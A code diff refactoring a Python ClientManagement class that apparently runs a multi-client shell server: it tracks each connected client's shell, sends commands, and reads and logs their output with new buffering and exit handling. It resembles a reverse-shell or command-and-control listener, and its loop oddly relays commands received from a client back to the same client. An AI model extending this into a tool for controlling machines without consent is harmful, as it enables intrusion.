@@ -17,7 +17,7 @@ class ClientManagement:
 
     def handle_client(self, conn, addr):
         """
-        Handles an individual client session.
+        Handles an individual client session with enhanced reliability.
         """
         with self.lock:
             self.client_id_counter += 1
@@ -30,28 +30,35 @@ class ClientManagement:
                 "hostname": None,
                 "shell": None,
             }
-            # Resolve hostname
             try:
                 client_info["hostname"] = socket.gethostbyaddr(addr[0])[0]
             except Exception:
                 client_info["hostname"] = "Unknown"
             self.clients[numeric_id] = client_info
+
         try:
             self.initialize_session(numeric_id, conn)
             shell = self.clients[numeric_id]["shell"]
             if not shell:
                 return  # Disconnect if no valid shell is detected
 
-            # Command handling loop
+            # Command handling loop with proper termination detection
             while True:
-                command = conn.recv(1024).decode(errors="replace")
-                if not command:
-                    logging.info(f"[ClientManagement] Client {numeric_id} disconnected.")
+                try:
+                    command = self.receive_data(conn)
+                    if command == "exit":
+                        logging.info(f"[ClientManagement] Client {numeric_id} requested to exit.")
+                        break
+
+                    logging.info(f"[ClientManagement] Received command from {numeric_id}: {command}")
+                    self.send_command_to_client(numeric_id, command)
+                except socket.timeout:
+                    logging.warning(f"[ClientManagement] Timeout for client {numeric_id}.")
                     break
-                logging.info(f"[ClientManagement] Received command from {numeric_id}: {command}")
-                self.send_command_to_client(numeric_id, command)
-        except Exception as e:
-            logging.error(f"[ClientManagement] Error during session with client {numeric_id}: {e}")
+                except Exception as e:
+                    logging.error(f"[ClientManagement] Error handling client {numeric_id}: {e}")
+                    break
+
         finally:
             self.disconnect_client(numeric_id)
 
@@ -112,7 +119,7 @@ class ClientManagement:
 
     def send_command_to_client(self, numeric_id, command):
         """
-        Sends a command to the specified client and retrieves the response.
+        Sends a command to the client and retrieves the response with reliability.
         """
         with self.lock:
             client = self.clients.get(numeric_id)
@@ -123,17 +130,33 @@ class ClientManagement:
         conn = client["connection"]
         try:
             conn.sendall(command.encode("utf-8"))
-            response = ""
-            while True:
-                chunk = conn.recv(4096).decode(errors="replace")
-                if not chunk:
-                    break
-                response += chunk
+            response = self.receive_response(conn)
             logging.info(f"[ClientManagement] Command output from {numeric_id}: {response}")
             return response
         except Exception as e:
             logging.error(f"[ClientManagement] Error sending command to client {numeric_id}: {e}")
             return None
+
+    def receive_data(self, conn):
+        """
+        Receives data from the client with enhanced reliability and buffering.
+        """
+        buffer = []
+        while True:
+            chunk = conn.recv(self.main_server.BUFFER_SIZE).decode(errors="replace")
+            if not chunk:
+                raise ConnectionError("Client disconnected.")
+            buffer.append(chunk)
+            if "[END_OF_RESPONSE]" in chunk:
+                break
+        return "".join(buffer).replace("[END_OF_RESPONSE]", "").strip()
+
+
+    def receive_response(self, conn):
+        """
+        Receives a response from the client with enhanced buffering.
+        """
+        return self.receive_data(conn)
 
     def get_active_clients(self):
         """
